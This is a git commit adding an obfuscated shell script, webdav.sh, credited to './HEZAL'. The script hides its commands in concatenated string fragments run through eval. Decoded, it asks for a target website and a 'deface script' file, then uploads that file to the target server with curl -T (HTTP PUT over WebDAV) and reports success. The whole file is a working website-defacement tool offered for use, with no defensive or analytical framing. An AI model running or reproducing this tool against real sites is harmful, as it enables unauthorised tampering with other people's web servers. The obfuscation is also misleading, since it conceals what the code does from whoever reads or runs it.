81c70430c2a4be0c24e5fa54bf8b10d3aa5bb265
Inti Tutorial <53834725+IntiTutorial@users.noreply.github.com>
2020-01-25 07:19:00 +0700

    Add files via upload

---
+++ webdav.sh
@@ -0,0 +1,5 @@
+#Encrypt by ./HEZAL
+#File Python
+z="
+";Oz=' ==>';Nz='rget';kz='echo';Iz='read';Dz='ay -';uz='AL';Ez='f ey';tz='/HEZ';Mz='e Ta';dz='rage';Sz='" Na';Kz='" We';gz='d/0/';Az='clea';qz=' "To';sz='By .';bz=' -T ';lz=' " [';Fz='es '\''';Gz='WEBD';iz='$tar';Vz=' Def';Xz='ya =';oz='ss..';jz='get';cz='/sto';Wz='acen';rz='ols ';Pz=' " t';hz='$sc ';nz='ukse';mz='!] S';Lz='bsit';Bz='r';fz='late';Yz='=> "';Tz='ma s';Rz='t';az='curl';Uz='ript';Hz='AV';pz='. "';ez='/emu';Cz='cows';Qz='arge';Jz=' -p ';Zz=' sc;';
+eval "$Az$Bz$z$Cz$Dz$Ez$Fz$Gz$Hz$z$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$z$Iz$Jz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$z$az$bz$cz$dz$ez$fz$gz$hz$iz$jz$z$kz$lz$mz$nz$oz$pz$z$kz$qz$rz$sz$tz$uz"
